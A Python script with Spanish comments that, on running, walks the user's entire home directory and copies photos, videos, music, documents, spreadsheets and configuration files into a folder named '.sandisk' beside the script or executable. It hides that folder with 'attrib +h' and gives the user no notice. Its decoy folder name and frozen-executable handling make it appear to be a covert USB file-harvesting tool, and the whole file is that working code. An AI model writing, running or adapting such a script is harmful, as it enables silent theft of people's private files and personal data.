import os
import sys
import shutil

def unir_listas_sin_duplicados(*listas):
    elementos_unicos = set()
    for lista in listas: elementos_unicos.update(lista)
    return list(elementos_unicos)

EXT_IMG = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.webp', 
    '.svg', '.ico', '.heic', '.heif', '.raw', '.cr2', '.nef', '.orf', 
    '.sr2', '.arw', '.dng', '.rw2', '.pef', '.raf', '.3fr', '.ptx', 
    '.srf', '.srw', '.x3f', '.erf', '.kdc', '.nrw', '.mrw', '.mef'
]

EXT_VID = [
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', 
    '.mpg', '.mpeg', '.m4v', '.3gp', '.3g2', '.f4v', '.mxf',
    '.ogv', '.rm', '.rmvb', '.ts', '.vob', '.mts', '.m2ts',
    '.divx', '.xvid', '.dv', '.asf', '.mpe', '.m1v', '.m2v',
    '.ogg', '.amv', '.qt'
]

EXT_COMP = [
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.z', '.lz', '.lzma',
    '.cab', '.iso', '.arj', '.lzh', '.tar.gz', '.tar.bz2', '.tar.xz', '.tgz', '.tbz2',
    '.txz', '.sit', '.sitx', '.deb', '.rpm', '.jar'
]

EXT_OTHERS = [
    '.mp3', '.wav', '.flac',        # Música
    '.pdf', '.doc', '.docx',        # Documentos
    '.xls', '.xlsx', '.csv',        # Hojas de cálculo
    '.ppt', '.pptx',                # Presentaciones
    '.txt', '.rtf',                 # Archivos de texto
    '.html', '.htm', '.xml',        # Archivos web y XML
    '.json', '.yaml', '.ini'        # Archivos de configuración
]

# Extensiones a extraer
EXT_PRIO = unir_listas_sin_duplicados(EXT_IMG, EXT_VID, EXT_OTHERS)
EXT_SECN = EXT_OTHERS

USER_DIR = os.path.expanduser("~")
NOMBRE_CARPETA = '.sandisk'
if getattr(sys, 'frozen', False): COPY_DIR = os.path.join(os.path.dirname(sys.executable), NOMBRE_CARPETA)
else: COPY_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), NOMBRE_CARPETA)

TOL_MB_ARCH_PEQ = 10.0 #MB
TOL_MB_ARCH_GRA = 100.0 #MB
TOL_MB_ARCH_GIG = 500.0 #MB

def peso_archivo_MB(file_path):
    try: return os.path.getsize(file_path) / (1024 * 1024)
    except Exception : return -1.0

def copiar_archivo(source_file, target_file):
    try:
        shutil.copy(source_file, target_file)
        print(f"Archivo {source_file}\nCopiado a {target_file}")
        return True
    except Exception as e:
        print(f"Error al copiar {source_file}:\n{e}")
        return False

def extraer_archivos_por_extension(origen, destino, extensiones_extraibles, extensiones_secundarias):
    # Crear el directorio de destino si no existe
    if not os.path.exists(destino): os.makedirs(destino)
    # Marcar el directorio como oculto en Windows
    try: os.system(f'attrib +h "{destino}"')
    except Exception as e: print(f"No se pudo marcar como oculto: {e}")

    # Archivo para registrar las rutas problemáticas
    archivo_error = os.path.join(destino, "errores.txt")
    archivos_errores = []

    archivos_grandes = {}
    archivos_gigantes = {}
    archivos_extremos = {}
    archivos_secundarios = {}

    # Recorrer el directorio de origen
    for root, _, files in os.walk(origen):
        for filename in files:
            # Obtener la extensión del archivo
            _, ext = os.path.splitext(filename)
            ext = ext.lower()  # Convertir a minúsculas para comparar con las extensiones

            # Si la extensión está en la lista de extensiones permitidas
            # Construir la ruta completa del archivo de origen
            if ext in extensiones_extraibles:
                source_file = os.path.join(root, filename)

                # Crear el directorio de destino basado en la extensión si no existe
                target_dir = os.path.join(destino, ext[1:])  # Eliminar el punto del inicio
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir)

                # Construir la ruta completa del archivo de destino
                target_file = os.path.join(target_dir, filename)
                size_file = peso_archivo_MB(source_file)

                # Si el archivo es secundario o es mas pesado que cierta tolerancia
                # Registra su ruta para ser recorrida despues
                if ext in extensiones_secundarias: archivos_secundarios[source_file] = target_file
                elif size_file > TOL_MB_ARCH_PEQ and size_file <= TOL_MB_ARCH_GRA:  archivos_grandes[source_file] = target_file
                elif size_file > TOL_MB_ARCH_GRA and size_file <= TOL_MB_ARCH_GIG:  archivos_gigantes[source_file] = target_file
                elif size_file > TOL_MB_ARCH_GIG:  archivos_extremos[source_file] = target_file
                else:
                    # Intentar copiar el archivo al directorio de destino
                    # Capturar el errores y registrar la ruta problemática
                    if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)

    # Itera sobre los archivos que no fueron copiados de primera
    for source_file, target_file in archivos_grandes.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)
    for source_file, target_file in archivos_secundarios.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)
    for source_file, target_file in archivos_gigantes.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)
    for source_file, target_file in archivos_extremos.items():
        if not copiar_archivo(source_file, target_file): archivos_errores.append(source_file)

    # Guardar las rutas de los archivos que no se pudieron copiar en el archivo de errores
    if archivos_errores:
        with open(archivo_error, 'w') as f:
            for error in archivos_errores:
                f.write(error + '\n')
        print(f"Se han registrado las rutas de los archivos no copiados en {archivo_error}")

extraer_archivos_por_extension(USER_DIR, COPY_DIR, EXT_PRIO, EXT_SECN)
